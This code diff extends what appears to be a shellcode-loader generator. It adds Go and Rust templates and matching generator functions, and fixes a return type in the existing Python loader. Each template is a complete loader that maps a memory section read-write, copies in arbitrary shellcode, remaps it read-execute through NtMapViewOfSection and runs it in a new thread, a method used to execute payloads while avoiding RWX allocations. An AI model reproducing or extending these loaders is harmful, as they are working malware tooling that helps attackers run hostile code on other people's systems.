@@ -154,6 +154,7 @@ import sys
 
 ntdll    = ctypes.windll.ntdll
 kernel32 = ctypes.windll.kernel32
+kernel32.CreateThread.restype = ctypes.c_void_p
 
 ViewUnmap = 2
 
@@ -215,6 +216,147 @@ ntdll.NtUnmapViewOfSection(ctypes.c_void_p(-1), rx)
 """
 
 
+_GO_TEMPLATE = """\
+package main
+
+import (
+\t"syscall"
+\t"unsafe"
+)
+
+{sc_bytes}
+
+func main() {{
+\tk32            := syscall.NewLazyDLL("kernel32.dll")
+\tntdll          := syscall.NewLazyDLL("ntdll.dll")
+\tpCreateThread  := k32.NewProc("CreateThread")
+\tpWaitSingle    := k32.NewProc("WaitForSingleObject")
+\tpCloseHandle   := k32.NewProc("CloseHandle")
+\tpRtlMove       := k32.NewProc("RtlMoveMemory")
+\tpNtCS          := ntdll.NewProc("NtCreateSection")
+\tpNtMV          := ntdll.NewProc("NtMapViewOfSection")
+\tpNtUMV         := ntdll.NewProc("NtUnmapViewOfSection")
+
+\t// Step 1: NtCreateSection
+\tvar hSection uintptr
+\tmaxSize := int64(len(sc))
+\ts, _, _ := pNtCS.Call(
+\t\tuintptr(unsafe.Pointer(&hSection)),
+\t\t0x0E, 0,
+\t\tuintptr(unsafe.Pointer(&maxSize)),
+\t\t0x40, 0x8000000, 0)
+\tif int32(s) < 0 {{
+\t\treturn
+\t}}
+
+\t// Step 2: map RW view
+\tvar rw, vsz uintptr
+\ts, _, _ = pNtMV.Call(
+\t\thSection, ^uintptr(0),
+\t\tuintptr(unsafe.Pointer(&rw)), 0, 0, 0,
+\t\tuintptr(unsafe.Pointer(&vsz)),
+\t\t2, 0, 0x04)
+\tif int32(s) < 0 {{
+\t\treturn
+\t}}
+
+\t// Step 3: write shellcode into RW view
+\tpRtlMove.Call(rw, uintptr(unsafe.Pointer(&sc[0])), uintptr(len(sc)))
+
+\t// Step 4: unmap RW view
+\tpNtUMV.Call(^uintptr(0), rw)
+
+\t// Step 5: map RX view
+\tvar rx uintptr
+\tvsz = 0
+\ts, _, _ = pNtMV.Call(
+\t\thSection, ^uintptr(0),
+\t\tuintptr(unsafe.Pointer(&rx)), 0, 0, 0,
+\t\tuintptr(unsafe.Pointer(&vsz)),
+\t\t2, 0, 0x20)
+\tif int32(s) < 0 {{
+\t\treturn
+\t}}
+
+\t// Step 6: execute
+\tht, _, _ := pCreateThread.Call(0, 0, rx, 0, 0, 0)
+\tif ht == 0 {{
+\t\tpNtUMV.Call(^uintptr(0), rx)
+\t\treturn
+\t}}
+\tpWaitSingle.Call(ht, 0xFFFFFFFF)
+\tpCloseHandle.Call(ht)
+\tpNtUMV.Call(^uintptr(0), rx)
+}}
+"""
+
+_RS_TEMPLATE = """\
+#![allow(non_snake_case)]
+use std::{{mem, ptr}};
+
+type NTSTATUS = i32;
+type FnNtCreateSection      = unsafe extern "system" fn(*mut *mut u8, u32, *mut u8, *mut i64, u32, u32, *mut u8) -> NTSTATUS;
+type FnNtMapViewOfSection   = unsafe extern "system" fn(*mut u8, *mut u8, *mut *mut u8, usize, usize, *mut i64, *mut usize, u32, u32, u32) -> NTSTATUS;
+type FnNtUnmapViewOfSection = unsafe extern "system" fn(*mut u8, *mut u8) -> NTSTATUS;
+
+#[link(name = "kernel32")]
+extern "system" {{
+    fn GetModuleHandleA(lpModuleName: *const u8) -> *mut u8;
+    fn GetProcAddress(hModule: *mut u8, lpProcName: *const u8) -> *mut u8;
+    fn CreateThread(lpThreadAttributes: *mut u8, dwStackSize: usize,
+                    lpStartAddress: unsafe extern "system" fn(*mut u8) -> u32,
+                    lpParameter: *mut u8, dwCreationFlags: u32,
+                    lpThreadId: *mut u32) -> *mut u8;
+    fn WaitForSingleObject(hHandle: *mut u8, dwMilliseconds: u32) -> u32;
+    fn CloseHandle(hObject: *mut u8) -> i32;
+    fn RtlMoveMemory(dest: *mut u8, src: *const u8, len: usize);
+}}
+
+fn main() {{
+    {sc_bytes}
+    unsafe {{
+        let ntdll = GetModuleHandleA(b"ntdll.dll\\0".as_ptr());
+        if ntdll.is_null() {{ return; }}
+
+        let NtCS:  FnNtCreateSection      = mem::transmute(GetProcAddress(ntdll, b"NtCreateSection\\0".as_ptr()));
+        let NtMV:  FnNtMapViewOfSection   = mem::transmute(GetProcAddress(ntdll, b"NtMapViewOfSection\\0".as_ptr()));
+        let NtUMV: FnNtUnmapViewOfSection = mem::transmute(GetProcAddress(ntdll, b"NtUnmapViewOfSection\\0".as_ptr()));
+
+        let proc = (!0usize) as *mut u8;
+
+        // Step 1: NtCreateSection
+        let mut hsec: *mut u8 = ptr::null_mut();
+        let mut max_size: i64 = sc.len() as i64;
+        if NtCS(&mut hsec, 0x0E, ptr::null_mut(), &mut max_size, 0x40, 0x8000000, ptr::null_mut()) < 0 {{ return; }}
+
+        // Step 2: map RW view
+        let mut rw: *mut u8 = ptr::null_mut();
+        let mut vsz: usize = 0;
+        if NtMV(hsec, proc, &mut rw, 0, 0, ptr::null_mut(), &mut vsz, 2, 0, 0x04) < 0 {{ return; }}
+
+        // Step 3: write shellcode
+        RtlMoveMemory(rw, sc.as_ptr(), sc.len());
+
+        // Step 4: unmap RW
+        NtUMV(proc, rw);
+
+        // Step 5: map RX view
+        let mut rx: *mut u8 = ptr::null_mut();
+        vsz = 0;
+        if NtMV(hsec, proc, &mut rx, 0, 0, ptr::null_mut(), &mut vsz, 2, 0, 0x20) < 0 {{ return; }}
+
+        // Step 6: execute
+        let entry: unsafe extern "system" fn(*mut u8) -> u32 = mem::transmute(rx);
+        let ht = CreateThread(ptr::null_mut(), 0, entry, ptr::null_mut(), 0, ptr::null_mut());
+        if ht.is_null() {{ NtUMV(proc, rx); return; }}
+        WaitForSingleObject(ht, 0xFFFFFFFF);
+        CloseHandle(ht);
+        NtUMV(proc, rx);
+    }}
+}}
+"""
+
+
 def generate_c(shellcode: bytes) -> str:
     """Return a C loader using NtCreateSection + NtMapViewOfSection double-map."""
     return _C_TEMPLATE.format(sc_array=_render.c_array_literal(shellcode, "sc"))
@@ -223,3 +365,13 @@ def generate_c(shellcode: bytes) -> str:
 def generate_python(shellcode: bytes) -> str:
     """Return a Python ctypes loader using NtCreateSection + NtMapViewOfSection."""
     return _PY_TEMPLATE.format(sc_bytes=_render.python_bytes_literal(shellcode, "sc"))
+
+
+def generate_go(shellcode: bytes) -> str:
+    """Return a Go loader using NtCreateSection + NtMapViewOfSection double-map."""
+    return _GO_TEMPLATE.format(sc_bytes=_render.go_bytes_literal(shellcode, "sc"))
+
+
+def generate_rust(shellcode: bytes) -> str:
+    """Return a Rust loader using NtCreateSection + NtMapViewOfSection double-map."""
+    return _RS_TEMPLATE.format(sc_bytes=_render.rust_bytes_literal(shellcode, "sc"))
